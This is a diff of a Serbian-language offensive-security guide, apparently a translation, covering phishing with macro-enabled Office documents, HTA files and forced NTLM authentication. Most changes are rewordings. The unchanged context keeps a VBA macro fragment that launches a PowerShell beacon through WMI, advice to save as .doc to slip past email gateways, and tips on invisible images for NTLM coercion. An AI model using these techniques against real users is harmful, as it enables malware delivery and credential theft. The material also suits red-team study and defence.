@@ -4,9 +4,9 @@
 
 ## Office Documents
 
-Microsoft Word vrši validaciju podataka datoteke pre otvaranja datoteke. Validacija podataka se vrši u obliku identifikacije strukture podataka, prema OfficeOpenXML standardu. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, datoteka koja se analizira neće biti otvorena.
+Microsoft Word vrši validaciju podataka datoteke pre otvaranja datoteke. Validacija podataka se vrši u obliku identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako dođe do greške tokom identifikacije strukture podataka, datoteka koja se analizira neće biti otvorena.
 
-Obično, Word datoteke koje sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i i dalje zadržati sposobnosti izvršavanja makroa.\
+Obično, Word datoteke koje sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i i dalje zadržati mogućnosti izvršavanja makroa.\
 Na primer, RTF datoteka ne podržava makroe, po dizajnu, ali DOCM datoteka preimenovana u RTF biće obrađena od strane Microsoft Word-a i biće sposobna za izvršavanje makroa.\
 Iste unutrašnje strukture i mehanizmi se primenjuju na sve softvere iz Microsoft Office Suite (Excel, PowerPoint itd.).
 
@@ -64,14 +64,14 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ručno uklanjanje metapodataka
+#### Ručno uklonite metapodatke
 
 Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite na **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.
 
 #### Doc Ekstenzija
 
 Kada završite, odaberite **Save as type** padajući meni, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
-To radite jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima ogromnu `!` i neki web/email prolazi ih potpuno blokiraju). Stoga, ova **legacy `.doc` ekstenzija je najbolje rešenje**.
+Uradite to jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima ogromnu `!` i neki web/email prolazi ih potpuno blokiraju). Stoga, ova **legacy `.doc` ekstenzija je najbolje rešenje**.
 
 #### Maliciozni Generatori Makroa
 
@@ -81,9 +81,9 @@ To radite jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma*
 
 ## HTA Fajlovi
 
-HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno poverljiva" aplikacija, bez ograničenja bezbednosnog modela pretraživača.
+HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno poverljiva" aplikacija, bez ograničenja sigurnosnog modela pretraživača.
 
-HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je deinstaliran, HTA-ovi neće moći da se izvrše.
+HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je deinstaliran, HTA neće moći da se izvrši.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -140,7 +140,7 @@ self.close
 ```
 ## Prisiljavanje NTLM autentifikacije
 
-Postoji nekoliko načina da se **prisilite NTLM autentifikaciju "na daljinu"**, na primer, možete dodati **nevidljive slike** u e-mailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili pošaljite žrtvi **adresu fajlova** koji će **pokrenuti** **autentifikaciju** samo za **otvaranje fascikle.**
+Postoji nekoliko načina da se **prisilite NTLM autentifikacija "na daljinu"**, na primer, možete dodati **nevidljive slike** u e-mailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili pošaljite žrtvi **adresu fajlova** koji će **pokrenuti** **autentifikaciju** samo za **otvaranje fascikle.**
 
 **Proverite ove ideje i još više na sledećim stranicama:**
 
